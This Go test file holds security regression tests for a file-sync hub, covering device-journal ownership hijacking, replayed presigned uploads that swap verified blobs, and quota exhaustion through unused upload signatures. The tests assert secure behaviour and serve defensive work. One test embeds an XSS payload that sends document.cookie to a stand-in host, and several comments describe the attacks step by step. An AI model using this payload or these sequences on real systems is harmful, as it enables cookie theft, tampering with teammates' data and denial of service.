package webapp

// Round 5 — the target is round 4's own fixes (b616c94) on the hub: the
// account binding ownJournal grew (DeviceRegistry.LookupIn, "first claim,
// within org"), RemoteSource.verify's once-per-blob content-address check on
// presigning storage, and the quota booking moved into /store/sign.
//
// Every test asserts the SECURE behavior, so it goes green the moment the hole
// is closed and stays as a permanent regression test. Helpers are prefixed
// secfx4; no existing file is touched.

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// ---- helpers -------------------------------------------------------------

// secfx4Registry gives a permHub the device registry every ownership decision
// in store.go now reads.
func secfx4Registry(t *testing.T, srv *Server) *DeviceRegistry {
	t.Helper()
	reg, err := OpenDeviceRegistry(filepath.Join(t.TempDir(), "devices.json"))
	if err != nil {
		t.Fatal(err)
	}
	srv.Devices = reg
	return reg
}

// secfx4Store is one store-API request carrying the device headers
// remote/http.go always sends.
func secfx4Store(t *testing.T, h http.Handler, method, target string, body string, c *http.Cookie, dev string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(method, target, strings.NewReader(body))
	if dev != "" {
		req.Header.Set("X-Bdrive-Device", dev)
		req.Header.Set("X-Bdrive-Device-Name", "machine-"+dev)
		req.Header.Set("X-Bdrive-Os", "darwin/arm64")
	}
	if c != nil {
		req.AddCookie(c)
	}
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

func secfx4PushJournal(t *testing.T, h http.Handler, project, dev, body string, c *http.Cookie) *httptest.ResponseRecorder {
	t.Helper()
	return secfx4Store(t, h, "PUT", "/api/p/"+project+"/store/object?key=journal/"+dev+".jsonl", body, c, dev)
}

func secfx4OpLine(seq int, kind, path, blob string) string {
	b, _ := json.Marshal(map[string]any{
		"seq": seq, "lamport": seq, "time": time.Now().UTC().Format(time.RFC3339Nano),
		"kind": kind, "path": path, "blob": blob, "size": 1,
	})
	return string(b) + "\n"
}

func secfx4Sha(s string) string {
	sum := sha256.Sum256([]byte(s))
	return hex.EncodeToString(sum[:])
}

// ---------------------------------------------------------------------------
// ownJournal's new account binding: LookupIn, "first claim, within org".
// ---------------------------------------------------------------------------

// handleStorePut calls observeDevice(r) BEFORE ownJournal(w, r, key). Observe
// creates the (account, id) row from the caller's own header, and LookupIn
// returns the row with the earliest FirstSeen. So for an id nobody holds a row
// for yet, the request being authorized manufactures the very fact that
// authorizes it: bob names alice's device id, becomes its first claimant on
// the way in, and passes.
//
// Round 4's own commit message calls this exact write "the critical": "any
// member wrote and replaced any peer's journal: her ops vanish, every device
// replays the attacker's deletes, History credits them to her". The header/key
// match was replaced by an ownership lookup that the same request can seed.
//
// The device ids this needs are not secret — History and /heat?by=device
// report them to every project member — and the window is every device that
// has not yet pushed to THIS hub: a teammate between `bdrive login` and their
// first `bdrive init`.
func TestSec_Journal_AnUnclaimedDeviceIdIsNotWonByTheWriteItGuards(t *testing.T) {
	h, srv, c, p := permHub(t)
	secfx4Registry(t, srv)

	const aliceDev = "alice-laptop-7c31"

	// bob is an ordinary member. He has never used this id and neither has
	// anyone else on this hub yet.
	body := secfx4OpLine(1, "delete", "quarterly-plan.md", "")
	rec := secfx4PushJournal(t, h, p.ID, aliceDev, body, c["bob"])
	if rec.Code != http.StatusForbidden {
		t.Errorf("bob wrote journal/%s.jsonl as alice's device: %d %s\n"+
			"handleStorePut observes the device from the request's own header before ownJournal "+
			"asks who owns it, so LookupIn returns the row this very request just created — "+
			"an id with no prior row authorizes whoever names it first",
			aliceDev, rec.Code, strings.TrimSpace(rec.Body.String()))
	}
}

// The same claim, seen from the victim's side: it is a permanent lockout.
// Once bob holds the earliest FirstSeen for an id, claimedBefore keeps him
// there forever — the row is never re-evaluated, DeviceRepo has no Delete,
// DeviceRegistry has no release, no admin route touches it, and the CLI has no
// command that re-mints device.json's id. Alice's laptop can never push to
// this project again, and the 403 body ("a device may only write its own
// journal") names no remedy.
//
// One store request from any member of the org is the whole attack.
func TestSec_Journal_TheRealOwnerStillSyncsAfterSomeoneElseNamedHerId(t *testing.T) {
	h, srv, c, p := permHub(t)
	secfx4Registry(t, srv)

	const aliceDev = "alice-laptop-88ab"

	// bob names her id once. Even a GET is enough — every /store/* handler
	// observes the device on the way in.
	if rec := secfx4Store(t, h, "GET", "/api/p/"+p.ID+"/store/list?prefix=blobs/", "", c["bob"], aliceDev); rec.Code != 200 {
		t.Fatalf("bob's store call: %d %s", rec.Code, rec.Body)
	}

	// Alice's laptop now comes online for the first time and pushes its
	// journal, exactly as remote/http.go does.
	rec := secfx4PushJournal(t, h, p.ID, aliceDev, secfx4OpLine(1, "put", "notes.md", secfx4Sha("hi")), c["alice"])
	if rec.Code != 200 {
		t.Errorf("alice cannot sync her own device: %d %s\n"+
			"bob's single store request registered (bob, %s) with the earliest FirstSeen, "+
			"LookupIn returns it forever, and nothing in the repo, the registry, the API or the CLI "+
			"can release a claim — this is an unrecoverable denial of sync inflicted by any org member",
			rec.Code, strings.TrimSpace(rec.Body.String()), aliceDev)
	}
}

// The registry rows are global; the VISIBILITY predicate is per project.
// deviceVisibleIn drops every row whose owner is not in the project's org, so
// an established owner's row simply disappears from LookupIn the moment she
// leaves the org — and the next member to name her id becomes its first
// visible claimant.
//
// Offboarding is the ordinary trigger: remove a teammate (the route owners are
// told to use), and her journal in every project of that org becomes writable
// by anyone still in it. Her whole contribution history can be replaced with
// deletes, and History still credits the ops to her device.
func TestSec_Journal_AnOffboardedMembersJournalIsNotUpForGrabs(t *testing.T) {
	h, srv, c, p := permHub(t)
	secfx4Registry(t, srv)

	const carolDev = "carol-desktop-4411"

	// carol syncs normally: her row is created, first-claimed, and she owns
	// her journal.
	if rec := secfx4Store(t, h, "GET", "/api/p/"+p.ID+"/store/list?prefix=blobs/", "", c["carol"], carolDev); rec.Code != 200 {
		t.Fatalf("carol's sync: %d %s", rec.Code, rec.Body)
	}
	real := secfx4OpLine(1, "put", "carols-report.md", secfx4Sha("carol's report"))
	if rec := secfx4PushJournal(t, h, p.ID, carolDev, real, c["carol"]); rec.Code != 200 {
		t.Fatalf("carol's own journal push: %d %s", rec.Code, rec.Body)
	}

	// Control: bob cannot touch it while she is a member.
	if rec := secfx4PushJournal(t, h, p.ID, carolDev, secfx4OpLine(1, "delete", "carols-report.md", ""), c["bob"]); rec.Code != http.StatusForbidden {
		t.Fatalf("control: bob wrote carol's journal while she was a member: %d %s", rec.Code, rec.Body)
	}

	// She leaves the org.
	if err := srv.Dir.RemoveMember(p.Org, "carol@x.io"); err != nil {
		t.Fatal(err)
	}

	rec := secfx4PushJournal(t, h, p.ID, carolDev, secfx4OpLine(1, "delete", "carols-report.md", ""), c["bob"])
	if rec.Code != http.StatusForbidden {
		t.Errorf("after carol was removed from the org, bob replaced her whole journal: %d %s\n"+
			"deviceVisibleIn hides a non-member's row from LookupIn, so the ownership fact "+
			"vanishes with the membership and the next caller to name the id is treated as its "+
			"first claimant — her ops are gone from every device and History still blames her",
			rec.Code, strings.TrimSpace(rec.Body.String()))
	}
}

// A row whose User is empty turns the whole binding off: ownJournal only
// refuses when `info.User != "" && info.User != caller`. Empty-owner rows are
// not hypothetical — they are what an upgrade produces. A devices.json written
// before the hub had accounts has no `user` and no `first_seen`, and
// claimedBefore explicitly sorts a zero FirstSeen OLDEST ("the safe direction:
// an established device keeps its identity against a newcomer"), so the
// ownerless row is the one LookupIn returns forever. The SQL backend's
// migration does the same thing: it copies `devices` rows into `device_rows`
// with whatever user_email they had, ” included.
//
// So on any hub carrying rows from before this field existed, round 4's
// critical is open again for exactly those devices — the established ones.
func TestSec_Journal_AnOwnerlessLegacyRowDoesNotDisableTheAccountBinding(t *testing.T) {
	h, srv, c, p := permHub(t)

	const aliceDev = "alice-laptop-legacy"
	// A devices.json as an older release wrote it: no user, no first_seen.
	path := filepath.Join(t.TempDir(), "devices.json")
	legacy := `{"devices":[{"id":"` + aliceDev + `","name":"Alice's MacBook","os":"darwin","last_seen":"2026-01-02T03:04:05Z"}]}`
	if err := os.WriteFile(path, []byte(legacy), 0o600); err != nil {
		t.Fatal(err)
	}
	reg, err := OpenDeviceRegistry(path)
	if err != nil {
		t.Fatal(err)
	}
	srv.Devices = reg

	rec := secfx4PushJournal(t, h, p.ID, aliceDev, secfx4OpLine(1, "delete", "quarterly-plan.md", ""), c["bob"])
	if rec.Code != http.StatusForbidden {
		t.Errorf("bob replaced journal/%s.jsonl on a hub upgraded from before device rows had owners: %d %s\n"+
			"ownJournal only refuses when info.User != \"\", and claimedBefore ranks a zero FirstSeen "+
			"as the earliest claim — so the pre-accounts row wins LookupIn and asserts no owner, "+
			"leaving the binding off for every device that existed before the upgrade",
			aliceDev, rec.Code, strings.TrimSpace(rec.Body.String()))
	}
}

// ---------------------------------------------------------------------------
// RemoteSource.verify — "verified once per blob, blobs are immutable".
// ---------------------------------------------------------------------------

// The premise of the once-per-blob cache is that a blob is immutable. On a
// presigning hub it is not: SignPut hands out a URL that writes straight into
// the object store and stays valid for the whole TTL (Upload.ttl(), 15 minutes
// by default), and an object store accepts every PUT to it, not the first.
//
// So the sequence is: get a URL, upload the honest bytes, let any read verify
// and cache them, then replay the same URL with different bytes. From then on
// verify() returns early on the cached answer and the hub serves whatever is
// stored under that sha256 — to the viewer, to history, to /store/object (the
// peers' fetch path), and to public /s/ share links, which are the reason this
// check was added at all.
//
// Re-uploading is not even necessary to reach the cache: the FIRST read of a
// blob is verified, and every read after it is not, so the window is the whole
// remaining life of the process.
func TestSec_Blob_AVerifiedBlobIsRecheckedWhenTheStoredObjectChanges(t *testing.T) {
	h, _, p, signer := secsignHub(t)
	honest := "the version everyone reviewed"
	sha := secfx4Sha(honest)

	// The honest upload, through the server, so it really is content-addressed.
	if rec := secsignReq(t, h, "PUT", "/api/p/"+p.ID+"/store/object?key=blobs/"+sha, []byte(honest), nil); rec.Code != 200 {
		t.Fatalf("honest put: %d %s", rec.Code, rec.Body)
	}
	// A read: this is what populates RemoteSource.verified.
	if rec := secsignReq(t, h, "GET", "/api/p/"+p.ID+"/store/object?key=blobs/"+sha, nil, nil); rec.Code != 200 {
		t.Fatalf("first read: %d %s", rec.Code, rec.Body)
	}

	// The presigned-URL replay: bytes land in the object store without passing
	// through the hub, which is exactly what "direct-to-storage" means.
	const evil = "<script>fetch('https://exfil.invalid/'+document.cookie)</script>"
	if err := signer.Put(context.Background(), p.ID+"/blobs/"+sha, strings.NewReader(evil), int64(len(evil))); err != nil {
		t.Fatal(err)
	}

	rec := secsignReq(t, h, "GET", "/api/p/"+p.ID+"/store/object?key=blobs/"+sha, nil, nil)
	if rec.Code == 200 && rec.Body.String() == evil {
		t.Errorf("the hub serves content that does not hash to its key:\n"+
			"  key   blobs/%s\n"+
			"  body  %q\n"+
			"verify() caches a sha in RemoteSource.verified after ONE read and never looks again, "+
			"but a presigned PUT is replayable for its whole TTL — so the check is defeated by "+
			"uploading the honest bytes first", sha, rec.Body.String())
	}
}

// The same substituted object, one surface over: /api/p/<id>/blob?sha= is the
// history version viewer, and it is the surface a reviewer uses to check what
// a change actually contained. Asserting it separately keeps a fix that only
// patches handleStoreGet from looking green.
func TestSec_Blob_HistoryVersionViewIsNotServedFromAStaleVerification(t *testing.T) {
	h, _, p, signer := secsignHub(t)
	honest := "approved text"
	sha := secfx4Sha(honest)

	if rec := secsignReq(t, h, "PUT", "/api/p/"+p.ID+"/store/object?key=blobs/"+sha, []byte(honest), nil); rec.Code != 200 {
		t.Fatalf("honest put: %d %s", rec.Code, rec.Body)
	}
	if rec := secsignReq(t, h, "GET", "/api/p/"+p.ID+"/blob?sha="+sha, nil, nil); rec.Code != 200 {
		t.Fatalf("first history read: %d %s", rec.Code, rec.Body)
	}

	const evil = "not what was approved"
	if err := signer.Put(context.Background(), p.ID+"/blobs/"+sha, strings.NewReader(evil), int64(len(evil))); err != nil {
		t.Fatal(err)
	}

	if rec := secsignReq(t, h, "GET", "/api/p/"+p.ID+"/blob?sha="+sha, nil, nil); rec.Code == 200 && rec.Body.String() == evil {
		t.Errorf("history serves a substituted version under the reviewed sha: %q", rec.Body.String())
	}
}

// ---------------------------------------------------------------------------
// The quota booking round 4 moved into /store/sign.
// ---------------------------------------------------------------------------

// "Book it here or never" is a false choice, and the version that shipped
// charges for bytes that may never exist. RecordUsage runs the moment a URL is
// minted, on a size the caller declared, for an object nobody has to upload —
// so any member of an org spends its entire storage allowance with a handful
// of JSON POSTs and no bytes at all. On a metered plan that is a bill; on a
// capped one it is a write outage for the whole org, and it cannot be undone
// because nothing ever refunds a sign that went unused.
//
// The keys do not even have to be plausible: any 64 hex characters that do not
// already exist gets its own signature and its own charge.
func TestSec_Sign_QuotaIsOnlyChargedForBytesThatArrive(t *testing.T) {
	h, srv, p, _ := secsignHub(t)
	q := &secsignQuota{}
	srv.Quota = q

	const gib = 1 << 30
	for i := 0; i < 20; i++ {
		sha := secfx4Sha(fmt.Sprintf("never-uploaded-%d", i))
		body, _ := json.Marshal(map[string]any{"key": "blobs/" + sha, "size": int64(gib)})
		rec := secsignReq(t, h, "POST", "/api/p/"+p.ID+"/store/sign", body, map[string]string{"Content-Type": "application/json"})
		if rec.Code != 200 {
			t.Fatalf("sign %d: %d %s", i, rec.Code, rec.Body)
		}
	}

	_, recorded := q.totals()
	if recorded != 0 {
		t.Errorf("the hub booked %d bytes for uploads that never happened (%d GiB)\n"+
			"handleStoreSign calls quota().RecordUsage on the DECLARED size at signing time, "+
			"and nothing reconciles it against what storage actually received — one member "+
			"exhausts the org's allowance with 20 JSON posts", recorded, recorded/gib)
	}
}
